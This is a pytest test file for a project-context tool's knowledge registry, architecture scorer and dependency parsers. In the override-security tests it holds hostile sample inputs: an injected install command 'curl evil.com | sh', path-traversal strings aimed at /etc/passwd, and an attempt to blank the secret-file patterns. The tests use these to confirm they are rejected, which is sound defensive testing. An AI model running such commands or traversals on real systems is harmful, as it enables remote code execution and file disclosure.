"""Tests for Knowledge Registry, SignalScorer, and data integrity."""

from __future__ import annotations

import json
import tempfile
from pathlib import Path

from loom_context.knowledge import get_registry
from loom_context.knowledge.models import ScoringEvidence
from loom_context.knowledge.registry import KnowledgeRegistry
from loom_context.knowledge.scorer import SignalScorer


class TestRegistryLoading:
    def test_singleton(self) -> None:
        r1 = get_registry()
        r2 = get_registry()
        assert r1 is r2

    def test_loads_all_json_files(self) -> None:
        r = KnowledgeRegistry()
        for name in [
            "languages.json",
            "ecosystems.json",
            "architectures.json",
            "directories.json",
            "security.json",
            "infrastructure.json",
            "roles.json",
            "docs.json",
            "stop_words.json",
            "markers.json",
        ]:
            data = r._load_json(name)
            assert data is not None
            assert isinstance(data, dict)

    def test_cache_returns_same_object(self) -> None:
        r = KnowledgeRegistry()
        d1 = r._load_json("languages.json")
        d2 = r._load_json("languages.json")
        assert d1 is d2


class TestRegistryLanguages:
    def test_get_language_by_name(self) -> None:
        r = KnowledgeRegistry()
        lang = r.get_language("python")
        assert lang is not None
        assert lang.name == "Python"
        assert ".py" in lang.extensions

    def test_get_language_by_extension(self) -> None:
        r = KnowledgeRegistry()
        lang = r.get_language(".rb")
        assert lang is not None
        assert lang.name == "Ruby"

    def test_get_language_unknown(self) -> None:
        r = KnowledgeRegistry()
        assert r.get_language(".xyz") is None

    def test_all_extensions_count(self) -> None:
        r = KnowledgeRegistry()
        exts = r.get_all_extensions()
        assert len(exts) >= 20
        assert ".py" in exts
        assert ".rb" in exts
        assert ".go" in exts
        assert ".rs" in exts
        assert ".java" in exts
        assert ".cs" in exts
        assert ".ex" in exts or ".exs" in exts

    def test_tier1_languages_have_frameworks(self) -> None:
        r = KnowledgeRegistry()
        for name in ["python", "ruby", "java"]:
            lang = r.get_language(name)
            assert lang is not None
            assert lang.frameworks, f"{name} should have frameworks"

    def test_tier1_languages_have_naming(self) -> None:
        r = KnowledgeRegistry()
        for name in ["python", "ruby", "rust", "java"]:
            lang = r.get_language(name)
            assert lang is not None
            assert lang.naming is not None, f"{name} should have naming"
            assert lang.naming.classes, f"{name} should have class naming"
        # Go uses types, not classes
        go = r.get_language("go")
        assert go is not None
        assert go.naming is not None


class TestRegistryPackages:
    def test_known_package(self) -> None:
        r = KnowledgeRegistry()
        info = r.get_package("react")
        assert info is not None
        assert info.category == "ui-framework"

    def test_known_package_by_ecosystem(self) -> None:
        r = KnowledgeRegistry()
        info = r.get_package("rails", "gem")
        assert info is not None
        assert info.category == "web-framework"

    def test_unknown_package(self) -> None:
        r = KnowledgeRegistry()
        assert r.get_package("totally-unknown-pkg-xyz") is None

    def test_infer_category(self) -> None:
        r = KnowledgeRegistry()
        assert r.infer_package_category("@types/react") == "type-definitions"
        assert r.infer_package_category("eslint-plugin-foo") == "linting"
        assert r.infer_package_category("expo-camera") == "expo-module"
        assert r.infer_package_category("unknown-thing") == "other"

    def test_categorize_known(self) -> None:
        r = KnowledgeRegistry()
        cat, desc = r.categorize_package("django")
        assert cat == "web-framework"
        assert desc

    def test_categorize_unknown_inferred(self) -> None:
        r = KnowledgeRegistry()
        cat, desc = r.categorize_package("@types/node")
        assert cat == "type-definitions"
        assert desc == ""


class TestRegistryArchitectures:
    def test_patterns_count(self) -> None:
        r = KnowledgeRegistry()
        patterns = r.get_architecture_patterns()
        assert len(patterns) >= 15

    def test_pattern_has_signals(self) -> None:
        r = KnowledgeRegistry()
        patterns = r.get_architecture_patterns()
        for name, pattern in patterns.items():
            assert pattern.signals, f"{name} should have signals"
            assert pattern.confidence_threshold > 0

    def test_boundary_rules_for_clean_arch(self) -> None:
        r = KnowledgeRegistry()
        rules = r.get_boundary_rules("clean-architecture")
        assert "domain" in rules
        assert "forbidden_imports" in rules["domain"]

    def test_boundary_rules_missing(self) -> None:
        r = KnowledgeRegistry()
        rules = r.get_boundary_rules("nonexistent-pattern")
        assert rules == {}


class TestRegistryDirectories:
    def test_known_annotation(self) -> None:
        r = KnowledgeRegistry()
        ann = r.get_directory_annotation("domain")
        assert ann is not None
        assert "Domain" in ann or "domain" in ann

    def test_unknown_annotation(self) -> None:
        r = KnowledgeRegistry()
        assert r.get_directory_annotation("zzz_nonexistent") is None

    def test_count(self) -> None:
        r = KnowledgeRegistry()
        all_ann = r.get_all_directory_annotations()
        assert len(all_ann) >= 150


class TestRegistrySecurity:
    def test_dir_exclusions(self) -> None:
        r = KnowledgeRegistry()
        excl = r.get_dir_exclusions()
        assert "node_modules" in excl
        assert ".git" in excl
        assert "__pycache__" in excl
        assert "target" in excl  # Rust
        assert "_build" in excl  # Elixir

    def test_secret_patterns(self) -> None:
        r = KnowledgeRegistry()
        secrets = r.get_secret_patterns()
        assert "*.pem" in secrets
        assert ".env" in secrets


class TestRegistryInfra:
    def test_get_service(self) -> None:
        r = KnowledgeRegistry()
        svc = r.get_infra_service("pg")
        assert svc is not None
        assert svc.name == "PostgreSQL"
        assert svc.default_port == 5432

    def test_get_service_ruby(self) -> None:
        r = KnowledgeRegistry()
        svc = r.get_infra_service("sidekiq")
        assert svc is not None
        assert svc.name == "Redis"

    def test_unknown_service(self) -> None:
        r = KnowledgeRegistry()
        assert r.get_infra_service("nonexistent-pkg") is None


class TestRegistryRoles:
    def test_suffixes(self) -> None:
        r = KnowledgeRegistry()
        suffixes = r.get_role_suffixes()
        assert len(suffixes) >= 25
        values = {s.value for s in suffixes}
        assert "Service" in values
        assert "Repository" in values
        assert "Controller" in values

    def test_prefixes(self) -> None:
        r = KnowledgeRegistry()
        prefixes = r.get_role_prefixes()
        assert len(prefixes) >= 5
        values = {p.value for p in prefixes}
        assert "I" in values
        assert "use" in values


class TestRegistryDocs:
    def test_filename_rules(self) -> None:
        r = KnowledgeRegistry()
        rules = r.get_doc_filename_rules()
        assert len(rules) >= 6
        patterns = {r.pattern for r in rules}
        assert "CHANGELOG" in patterns

    def test_path_rules(self) -> None:
        r = KnowledgeRegistry()
        rules = r.get_doc_path_rules()
        assert len(rules) >= 14


class TestRegistryStopWords:
    def test_combined(self) -> None:
        r = KnowledgeRegistry()
        sw = r.get_stop_words()
        assert "the" in sw  # EN
        assert "el" in sw  # ES
        assert len(sw) >= 80


class TestRegistryMarkers:
    def test_priority_markers(self) -> None:
        r = KnowledgeRegistry()
        markers = r.get_priority_markers()
        assert len(markers) >= 20
        # First should be terraform or monorepo (high priority)
        marker_names = [m[0] for m in markers]
        assert "main.tf" in marker_names
        assert "Gemfile" in marker_names
        assert "Cargo.toml" in marker_names

    def test_package_json_dep_rules(self) -> None:
        r = KnowledgeRegistry()
        rules = r.get_package_json_dep_rules()
        dep_names = [r[0] for r in rules]
        assert "react-native" in dep_names
        assert "react" in dep_names


class TestRegistryDomains:
    def test_available_domains(self) -> None:
        r = KnowledgeRegistry()
        domains = r.get_available_domains()
        assert "code" in domains
        assert "research" in domains
        assert "data" in domains

    def test_get_domain(self) -> None:
        r = KnowledgeRegistry()
        d = r.get_domain("code")
        assert d is not None
        assert d["name"] == "code"


class TestRegistryLocalOverrides:
    def test_override_extends_languages(self) -> None:
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        (kb / "languages.json").write_text(
            json.dumps({"brainfuck": {"name": "Brainfuck", "extensions": [".bf"]}})
        )

        r = KnowledgeRegistry(project_root=tmp)
        lang = r.get_language(".bf")
        assert lang is not None
        assert lang.name == "Brainfuck"

        # Built-in still works
        py = r.get_language("python")
        assert py is not None

    def test_security_json_cannot_be_overridden(self) -> None:
        """Malicious .loom/knowledge/security.json must be ignored."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        # Attempt to empty all security patterns
        (kb / "security.json").write_text(
            json.dumps({"dir_exclusions": [], "secret_patterns": []})
        )

        r = KnowledgeRegistry(project_root=tmp)
        # Security patterns must remain intact (built-in values)
        excl = r.get_dir_exclusions()
        assert "node_modules" in excl
        assert ".git" in excl
        secrets = r.get_secret_patterns()
        assert "*.pem" in secrets
        assert ".env" in secrets

    def test_type_mismatch_attack_blocked(self) -> None:
        """Override that changes list→string must be rejected."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        # Attempt type confusion: replace dict value with string
        (kb / "directories.json").write_text(
            json.dumps({"annotations": "HACKED"})
        )

        r = KnowledgeRegistry(project_root=tmp)
        # Must still return the original dict, not "HACKED"
        ann = r.get_directory_annotation("domain")
        assert ann is not None
        assert isinstance(r.get_all_directory_annotations(), dict)

    def test_override_cannot_shrink_lists(self) -> None:
        """Override with empty list must not remove built-in entries."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        (kb / "roles.json").write_text(
            json.dumps({"suffixes": [], "prefixes": []})
        )

        r = KnowledgeRegistry(project_root=tmp)
        suffixes = r.get_role_suffixes()
        assert len(suffixes) >= 25  # Built-in count preserved

    def test_infrastructure_json_cannot_be_overridden(self) -> None:
        """Malicious infrastructure.json override = command injection vector."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        (kb / "infrastructure.json").write_text(
            json.dumps(
                {
                    "services": {
                        "postgresql": {"install_cmd_mac": "curl evil.com | sh"}
                    }
                }
            )
        )

        r = KnowledgeRegistry(project_root=tmp)
        svc = r.get_infra_service("pg")
        assert svc is not None
        # Must use built-in command, not the injected one
        assert "evil" not in svc.install_cmd_mac
        assert "brew" in svc.install_cmd_mac or "apt" in svc.install_cmd_linux

    def test_markers_json_cannot_be_overridden(self) -> None:
        """markers.json override could redirect project detection."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        (kb / "markers.json").write_text(
            json.dumps({"priority_markers": [{"marker": "evil.txt", "project_type": "evil"}]})
        )

        r = KnowledgeRegistry(project_root=tmp)
        markers = r.get_priority_markers()
        marker_types = [m[1] for m in markers]
        assert "evil" not in marker_types

    def test_path_traversal_in_domain_blocked(self) -> None:
        """get_domain with path traversal must return None."""
        r = KnowledgeRegistry()
        assert r.get_domain("../../etc/passwd") is None
        assert r.get_domain("../security") is None
        assert r.get_domain("foo/bar") is None

    def test_path_traversal_in_load_json_blocked(self) -> None:
        """_load_json with path traversal must raise ValueError."""
        r = KnowledgeRegistry()
        with __import__("pytest").raises(ValueError, match="Invalid knowledge filename"):
            r._load_json("../../../etc/passwd.json")

    def test_oversized_override_ignored(self) -> None:
        """Override files > 1MB must be silently ignored."""
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        # Write a 2MB file
        big_data = {"x" * i: "y" * 100 for i in range(20000)}
        (kb / "languages.json").write_text(json.dumps(big_data))

        r = KnowledgeRegistry(project_root=tmp)
        # Should still return built-in Python, not the garbage
        py = r.get_language("python")
        assert py is not None
        assert py.name == "Python"

    def test_override_adds_directory_annotations(self) -> None:
        tmp = Path(tempfile.mkdtemp())
        kb = tmp / ".loom" / "knowledge"
        kb.mkdir(parents=True)
        (kb / "directories.json").write_text(
            json.dumps({"annotations": {"my_custom_dir": "Custom directory"}})
        )

        r = KnowledgeRegistry(project_root=tmp)
        ann = r.get_directory_annotation("my_custom_dir")
        assert ann == "Custom directory"

        # Built-in still works
        assert r.get_directory_annotation("domain") is not None


class TestSignalScorer:
    def test_clean_architecture_detected(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"domain", "infrastructure", "presentation"},
            all_directories={
                "domain",
                "infrastructure",
                "presentation",
                "entities",
                "use_cases",
            },
        )
        matches = s.score_all(patterns, evidence)
        names = [m.name for m in matches]
        assert "clean-architecture" in names

    def test_ddd_detected(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"app"},
            all_directories={
                "app",
                "domains",
                "aggregates",
                "value_objects",
                "bounded_contexts",
                "entities",
            },
            file_suffixes={"Aggregate", "ValueObject"},
        )
        matches = s.score_all(patterns, evidence)
        names = [m.name for m in matches]
        assert "ddd" in names

    def test_flat_project_no_matches(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"src"},
            all_directories={"src", "main"},
        )
        matches = s.score_all(patterns, evidence)
        assert len(matches) == 0

    def test_pipeline_detected(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"scanners", "generators", "auditors"},
            all_directories={"scanners", "generators", "auditors"},
        )
        matches = s.score_all(patterns, evidence)
        names = [m.name for m in matches]
        assert "pipeline" in names

    def test_legacy_compat(self) -> None:
        """Legacy exact-match sets should still trigger detection."""
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"models", "views", "controllers"},
            all_directories={"models", "views", "controllers"},
        )
        matches = s.score_all(patterns, evidence)
        names = [m.name for m in matches]
        assert "mvc" in names

    def test_multiple_patterns_detected(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={
                "domain",
                "infrastructure",
                "presentation",
                "events",
                "listeners",
                "handlers",
            },
            all_directories={
                "domain",
                "infrastructure",
                "presentation",
                "events",
                "listeners",
                "handlers",
                "subscribers",
            },
            file_suffixes={"Event", "Listener"},
        )
        matches = s.score_all(patterns, evidence)
        names = [m.name for m in matches]
        assert len(matches) >= 2
        assert "clean-architecture" in names
        assert "event-driven" in names

    def test_confidence_levels(self) -> None:
        r = KnowledgeRegistry()
        s = SignalScorer()
        patterns = r.get_architecture_patterns()
        evidence = ScoringEvidence(
            directories={"domain", "infrastructure", "presentation"},
            all_directories={
                "domain",
                "infrastructure",
                "presentation",
                "entities",
                "use_cases",
                "ports",
                "adapters",
            },
            file_suffixes={"UseCase", "Repository"},
        )
        matches = s.score_all(patterns, evidence)
        # At least one should be high confidence
        confidences = {m.confidence for m in matches}
        assert "high" in confidences or "medium" in confidences


class TestKnowledgeDataIntegrity:
    def test_all_languages_have_extensions(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("languages.json")
        for lang_id, lang_data in data.items():
            assert lang_data.get("extensions"), f"{lang_id} missing extensions"

    def test_all_languages_have_name(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("languages.json")
        for lang_id, lang_data in data.items():
            assert lang_data.get("name"), f"{lang_id} missing name"

    def test_all_packages_have_category(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("ecosystems.json")
        for eco_name, eco_data in data.get("ecosystems", {}).items():
            for pkg_name, pkg_data in eco_data.get("packages", {}).items():
                assert pkg_data.get("category"), f"{eco_name}/{pkg_name} missing category"

    def test_all_patterns_have_signals(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("architectures.json")
        for pid, pdata in data.get("patterns", {}).items():
            assert pdata.get("signals"), f"{pid} missing signals"
            assert pdata.get("confidence_threshold"), f"{pid} missing threshold"

    def test_all_signals_have_weight(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("architectures.json")
        for pid, pdata in data.get("patterns", {}).items():
            for i, signal in enumerate(pdata.get("signals", [])):
                assert "weight" in signal, f"{pid} signal {i} missing weight"
                assert signal["weight"] > 0, f"{pid} signal {i} has zero weight"

    def test_no_empty_dir_annotations(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("directories.json")
        for name, desc in data.get("annotations", {}).items():
            assert desc.strip(), f"Empty annotation for '{name}'"

    def test_security_patterns_not_empty(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("security.json")
        assert len(data.get("dir_exclusions", [])) >= 20
        assert len(data.get("secret_patterns", [])) >= 20

    def test_all_regex_patterns_compile(self) -> None:
        """All regex in language patterns must be valid."""
        import re

        r = KnowledgeRegistry()
        data = r._load_json("languages.json")
        for lang_id, lang_data in data.items():
            for field in [
                "import_pattern", "class_pattern",
                "function_pattern", "constant_pattern",
            ]:
                pattern = lang_data.get(field, "")
                if pattern:
                    try:
                        re.compile(pattern)
                    except re.error as e:
                        raise AssertionError(  # noqa: B904
                            f"{lang_id}/{field} invalid regex: {e}"
                        )

    def test_all_design_pattern_regex_compile(self) -> None:
        """All regex in design pattern signals must be valid."""
        import re

        r = KnowledgeRegistry()
        data = r._load_json("design_patterns.json")
        for pid, pdata in data.get("patterns", {}).items():
            for sig in pdata.get("signals", []):
                if sig.get("type") == "code_pattern":
                    pattern = sig.get("pattern", "")
                    try:
                        re.compile(pattern)
                    except re.error as e:
                        raise AssertionError(  # noqa: B904
                            f"design_patterns/{pid}: {e}"
                        )

    def test_language_patterns_match_real_code(self) -> None:
        """Core language patterns must match typical code constructs."""
        import re

        r = KnowledgeRegistry()
        data = r._load_json("languages.json")

        cases = [
            ("python", "class_pattern", "class UserService:", "UserService"),
            ("python", "function_pattern", "def handle(self):", "handle"),
            ("python", "function_pattern", "async def fetch(url):", "fetch"),
            ("ruby", "class_pattern", "class UsersController < App", "UsersController"),
            ("ruby", "class_pattern", "module Auth", "Auth"),
            ("ruby", "function_pattern", "def perform(id)", "perform"),
            ("java", "class_pattern", "public interface UserRepo {", "UserRepo"),
            ("java", "class_pattern", "public enum Status {", "Status"),
            ("java", "function_pattern", "public void handle(String id) {", "handle"),
            ("go", "class_pattern", "type Repo interface {", "Repo"),
            ("go", "class_pattern", "type User struct {", "User"),
            ("go", "function_pattern", "func Handle(w http.ResponseWriter) {", "Handle"),
            ("rust", "class_pattern", "pub struct Service {", "Service"),
            ("rust", "class_pattern", "pub enum Status {", "Status"),
            ("rust", "class_pattern", "pub trait Repository {", "Repository"),
            ("rust", "function_pattern", "pub fn handle(&self) {", "handle"),
            ("typescript", "class_pattern", "export interface IService {", "IService"),
            ("typescript", "class_pattern", "export class AuthService {", "AuthService"),
            ("kotlin", "class_pattern", "data class UserDTO(val n: String)", "UserDTO"),
            ("kotlin", "class_pattern", "enum class Status {", "Status"),
            ("csharp", "class_pattern", "public interface IUserService {", "IUserService"),
            ("csharp", "class_pattern", "public record UserDTO(string N);", "UserDTO"),
            ("elixir", "class_pattern", "defmodule MyApp.Auth do", "MyApp.Auth"),
        ]

        for lang, field, code, expected in cases:
            pat = data.get(lang, {}).get(field, "")
            assert pat, f"{lang}/{field} missing"
            matches = re.findall(pat, code)
            assert expected in matches, (
                f"{lang}/{field}: '{expected}' not in {matches} for '{code}'"
            )

    def test_infra_package_mapping_resolves(self) -> None:
        r = KnowledgeRegistry()
        data = r._load_json("infrastructure.json")
        services = data.get("services", {})
        for pkg, svc_id in data.get("package_mapping", {}).items():
            assert svc_id in services, f"Package '{pkg}' maps to unknown service '{svc_id}'"


class TestGemfileParser:
    def test_parses_gems(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "Gemfile").write_text(
            "source 'https://rubygems.org'\n"
            "gem 'rails', '~> 7.0'\n"
            "gem 'pg'\n"
            "gem 'puma', '~> 6.0'\n"
            "\n"
            "group :development, :test do\n"
            "  gem 'rspec-rails'\n"
            "end\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "rails" in names
        assert "pg" in names
        assert "puma" in names
        assert "rspec-rails" in names
        assert result["package_manager"] == "bundler"

        # rspec-rails should be dev
        rspec = next(d for d in result["dependencies"] if d["name"] == "rspec-rails")
        assert rspec["dev"] is True


class TestCargoTomlParser:
    def test_parses_crates(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "Cargo.toml").write_text(
            '[package]\nname = "myapp"\nversion = "0.1.0"\n\n'
            "[dependencies]\n"
            'axum = "0.7"\n'
            'serde = { version = "1.0", features = ["derive"] }\n'
            'tokio = "1.0"\n'
            "\n"
            "[dev-dependencies]\n"
            'criterion = "0.5"\n'
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "axum" in names
        assert "serde" in names
        assert "tokio" in names
        assert "criterion" in names
        assert result["package_manager"] == "cargo"

        crit = next(d for d in result["dependencies"] if d["name"] == "criterion")
        assert crit["dev"] is True


class TestGoModParser:
    def test_parses_modules(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "go.mod").write_text(
            "module github.com/myorg/myapp\n\n"
            "go 1.21\n\n"
            "require (\n"
            "\tgithub.com/gin-gonic/gin v1.9.1\n"
            "\tgithub.com/jackc/pgx/v5 v5.5.0\n"
            "\tgo.uber.org/zap v1.26.0\n"
            ")\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "gin" in names
        assert "pgx" in names or "v5" in names
        assert "zap" in names
        assert result["package_manager"] == "go"


class TestMixExsParser:
    def test_parses_hex_deps(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "mix.exs").write_text(
            "defmodule MyApp.MixProject do\n"
            "  defp deps do\n"
            "    [\n"
            '      {:phoenix, "~> 1.7"},\n'
            '      {:ecto, "~> 3.10"},\n'
            '      {:ex_machina, "~> 2.7", only: :test}\n'
            "    ]\n"
            "  end\n"
            "end\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "phoenix" in names
        assert "ecto" in names
        assert "ex_machina" in names
        assert result["package_manager"] == "hex"


class TestPomXmlParser:
    def test_parses_maven_deps(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "pom.xml").write_text(
            '<?xml version="1.0"?>\n<project>\n'
            "  <dependencies>\n"
            "    <dependency>\n"
            "      <groupId>org.springframework.boot</groupId>\n"
            "      <artifactId>spring-boot</artifactId>\n"
            "      <version>3.2.0</version>\n"
            "    </dependency>\n"
            "    <dependency>\n"
            "      <groupId>junit</groupId>\n"
            "      <artifactId>junit</artifactId>\n"
            "      <scope>test</scope>\n"
            "    </dependency>\n"
            "  </dependencies>\n"
            "</project>\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "spring-boot" in names
        assert "junit" in names
        assert result["package_manager"] == "maven"

        junit = next(d for d in result["dependencies"] if d["name"] == "junit")
        assert junit["dev"] is True


class TestGradleParser:
    def test_parses_gradle_deps(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "build.gradle").write_text(
            "dependencies {\n"
            "    implementation 'org.springframework.boot:spring-boot:3.2.0'\n"
            "    testImplementation 'junit:junit:4.13'\n"
            "}\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "spring-boot" in names
        assert "junit" in names
        assert result["package_manager"] == "gradle"


class TestCsprojParser:
    def test_parses_nuget_refs(self, tmp_path: Path) -> None:
        from loom_context.scanners.deps import DependencyScanner
        from loom_context.security.filter import FileFilter

        (tmp_path / "MyApp.csproj").write_text(
            "<Project>\n"
            "  <ItemGroup>\n"
            '    <PackageReference Include="Newtonsoft.Json" Version="13.0" />\n'
            '    <PackageReference Include="xunit" Version="2.6" />\n'
            "  </ItemGroup>\n"
            "</Project>\n"
        )
        ff = FileFilter(tmp_path)
        scanner = DependencyScanner(tmp_path, ff)
        result = scanner.scan()
        names = [d["name"] for d in result["dependencies"]]
        assert "Newtonsoft.Json" in names
        assert "xunit" in names
        assert result["package_manager"] == "nuget"
